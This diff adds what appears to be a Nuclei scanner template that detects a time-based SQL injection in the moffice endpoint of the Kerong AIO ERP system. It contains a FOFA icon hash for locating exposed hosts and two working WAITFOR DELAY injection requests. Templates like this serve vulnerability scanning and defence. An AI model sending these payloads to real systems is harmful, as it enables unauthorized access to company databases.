@@ -1,0 +1,25 @@
+id: kerong-aio-moffice-sql
+info:
+  name: "科荣AIO moffice 接口 SQL 注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: icon_hash="-638292089"
+          科荣AIO软件作为面向生产制造业的动态ERP解决方案，通过行业细分化策略满足企业个性化管理需求。该系统基于制造业多行业特性开发了机械、电子、纺织、家具等垂直行业版本。其moffice接口存在SQL注入安全缺陷，攻击者可利用此漏洞执行恶意SQL查询，从而获取数据库中的敏感信息。
+  tags: 科荣AIO
+http:
+- raw:
+  - |
+    GET /moffice?op=showWorkPlan&planId=1';WAITFOR+DELAY+'0:0:5'--&sid=1 HTTP/1.1
+    Host: {{Hostname}}
+    Connection: close
+  - |
+    GET /moffice?op=showWorkPlan&planId=1';WAITFOR+DELAY+'0:0:8'--&sid=1 HTTP/1.1
+    Host: {{Hostname}}
+    Connection: close
+  matchers:
+  - type: dsl
+    dsl:
+    - duration_1>=5 && duration_1<=6
+    - duration_2>=8 && duration_2<=9
+    condition: and
